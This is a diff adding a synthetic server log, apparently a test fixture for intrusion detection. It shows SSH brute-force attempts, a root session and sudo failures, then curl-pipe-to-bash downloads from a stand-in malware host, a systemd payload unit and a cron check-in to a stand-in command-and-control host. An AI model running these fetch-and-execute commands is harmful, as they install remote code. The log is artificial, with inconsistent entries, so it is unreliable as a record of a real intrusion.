@@ -1,0 +1,65 @@
+Apr 22 07:05:52 server sshd[1000]: Failed password for invalid user test from 198.18.0.99 port 10022 ssh2
+Apr 22 07:04:52 server sshd[1001]: Failed password for invalid user admin from 198.51.100.89 port 22 ssh2
+Apr 22 07:03:52 server sshd[1002]: Failed password for invalid user admin from 192.0.2.123 port 22 ssh2
+Apr 22 07:02:52 server sshd[1003]: Failed password for invalid user test from 198.18.0.99 port 2222 ssh2
+Apr 22 07:01:52 server sshd[1004]: Failed password for invalid user admin from 198.51.100.89 port 10022 ssh2
+Apr 22 07:00:52 server sshd[1005]: Failed password for ubuntu from 192.0.2.123 port 10022 ssh2
+Apr 22 06:59:52 server sshd[1006]: Failed password for app from 203.0.113.45 port 2222 ssh2
+Apr 22 06:58:52 server sshd[1007]: Failed password for admin from 198.51.100.89 port 22 ssh2
+Apr 22 06:57:52 server sshd[1008]: Failed password for admin from 192.0.2.123 port 10022 ssh2
+Apr 22 06:56:52 server sshd[1009]: Failed password for admin from 198.51.100.89 port 10022 ssh2
+Apr 22 06:55:52 server sshd[1010]: Failed password for ubuntu from 198.51.100.89 port 10022 ssh2
+Apr 22 06:54:52 server sshd[1011]: Failed password for ec2-user from 198.51.100.89 port 22 ssh2
+Apr 22 06:53:52 server sshd[1012]: Failed password for ec2-user from 198.18.0.99 port 10022 ssh2
+Apr 22 06:52:52 server sshd[1013]: Failed password for app from 192.0.2.123 port 10022 ssh2
+Apr 22 06:51:52 server sshd[1014]: Failed password for app from 192.0.2.123 port 2222 ssh2
+Apr 22 06:50:52 server sshd[1015]: Failed password for app from 192.0.2.123 port 10022 ssh2
+Apr 22 06:49:52 server sshd[1016]: Failed password for app from 198.18.0.99 port 10022 ssh2
+Apr 22 06:48:52 server sshd[1017]: Failed password for webapp from 203.0.113.45 port 22 ssh2
+Apr 22 06:47:52 server sshd[1018]: Failed password for admin from 198.51.100.89 port 22 ssh2
+Apr 22 06:46:52 server sshd[1019]: Failed password for admin from 198.18.0.99 port 10022 ssh2
+Apr 22 06:45:52 server sshd[1020]: Failed password for admin from 198.18.0.99 port 10022 ssh2
+Apr 22 06:44:52 server sshd[1021]: Failed password for webapp from 192.0.2.123 port 22 ssh2
+Apr 22 06:43:52 server sshd[1022]: Failed password for webapp from 198.18.0.99 port 10022 ssh2
+Apr 22 06:42:52 server sshd[1023]: Failed password for ubuntu from 203.0.113.45 port 22 ssh2
+Apr 22 06:41:52 server sshd[1024]: Failed password for app from 203.0.113.45 port 10022 ssh2
+Apr 22 06:40:52 server sshd[1025]: Failed password for webapp from 192.0.2.123 port 22 ssh2
+Apr 22 06:39:52 server sshd[1026]: Failed password for app from 198.18.0.99 port 10022 ssh2
+Apr 22 06:38:52 server sshd[1027]: Failed password for ec2-user from 198.51.100.89 port 10022 ssh2
+Apr 22 06:37:52 server sshd[1028]: Failed password for app from 192.0.2.123 port 10022 ssh2
+Apr 22 06:36:52 server sshd[1029]: Failed password for ec2-user from 198.18.0.99 port 22 ssh2
+Apr 22 06:35:52 server sshd[1030]: Failed password for ubuntu from 198.51.100.89 port 22 ssh2
+Apr 22 06:34:52 server sshd[1031]: Failed password for admin from 192.0.2.123 port 2222 ssh2
+Apr 22 06:33:52 server sshd[1032]: Failed password for ubuntu from 198.51.100.89 port 2222 ssh2
+Apr 22 06:32:52 server sshd[1033]: Failed password for app from 198.18.0.99 port 10022 ssh2
+Apr 22 06:31:52 server sshd[1034]: Failed password for ec2-user from 198.51.100.89 port 22 ssh2
+Apr 22 06:30:52 server sshd[1035]: Failed password for webapp from 192.0.2.123 port 10022 ssh2
+Apr 22 06:29:52 server sshd[1036]: Failed password for ubuntu from 198.51.100.89 port 22 ssh2
+Apr 22 06:28:52 server sshd[1037]: Failed password for app from 198.51.100.89 port 10022 ssh2
+Apr 22 06:27:52 server sshd[1038]: Failed password for admin from 203.0.113.45 port 22 ssh2
+Apr 22 06:26:52 server sshd[1039]: Failed password for ec2-user from 198.51.100.89 port 2222 ssh2
+Apr 22 06:25:52 server sshd[1040]: Failed password for ec2-user from 192.0.2.123 port 22 ssh2
+Apr 22 06:24:52 server sshd[1041]: Failed password for webapp from 192.0.2.123 port 10022 ssh2
+Apr 22 06:23:52 server sshd[1042]: Failed password for ubuntu from 203.0.113.45 port 10022 ssh2
+Apr 22 06:22:52 server sshd[1043]: Failed password for webapp from 192.0.2.123 port 2222 ssh2
+Apr 22 06:21:52 server sshd[1044]: Failed password for webapp from 203.0.113.45 port 22 ssh2
+Apr 22 06:20:52 server sshd[1045]: Failed password for admin from 198.18.0.99 port 2222 ssh2
+Apr 22 06:19:52 server sshd[1046]: Failed password for ubuntu from 198.51.100.89 port 22 ssh2
+Apr 22 06:18:52 server sshd[1047]: Failed password for admin from 203.0.113.45 port 22 ssh2
+Apr 22 06:17:52 server sshd[1048]: Failed password for ubuntu from 192.0.2.123 port 22 ssh2
+Apr 22 06:16:52 server sshd[1049]: Failed password for ec2-user from 203.0.113.45 port 10022 ssh2
+Apr 22 06:15:52 server sshd[1050]: Failed password for ec2-user from 203.0.113.45 port 10022 ssh2
+Apr 22 06:14:52 server sshd[1051]: Failed password for ubuntu from 192.0.2.123 port 2222 ssh2
+Apr 22 06:13:52 server sshd[1052]: Failed password for webapp from 203.0.113.45 port 10022 ssh2
+Apr 22 06:12:52 server sshd[1053]: Failed password for ec2-user from 198.51.100.89 port 22 ssh2
+Apr 22 06:11:52 server sshd[1054]: Failed password for webapp from 198.51.100.89 port 10022 ssh2
+Apr 22 06:10:52 server sshd[1055]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Apr 22 06:09:52 server sudo: sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0
+Apr 22 06:08:52 server sudo: sudo: ubuntu : authentication failure
+Apr 22 06:07:52 server sudo: sudo: ubuntu : authentication failure
+Apr 22 06:06:52 server kernel: curl http://malware.example.com/payload.sh | bash
+Apr 22 06:05:52 server kernel: curl http://malware.example.com/payload.sh | bash
+Apr 22 06:04:52 server kernel: systemd[1]: Starting Download and Execute Payload...
+Apr 22 06:03:52 server kernel: systemd[1]: Starting Download and Execute Payload...
+Apr 22 06:02:52 server CRON[15234]: (root) CMD root
+Apr 22 06:01:52 server CRON[15235]: CRON[15234]: (root) CMD (curl http://c2.example.com/checkin)
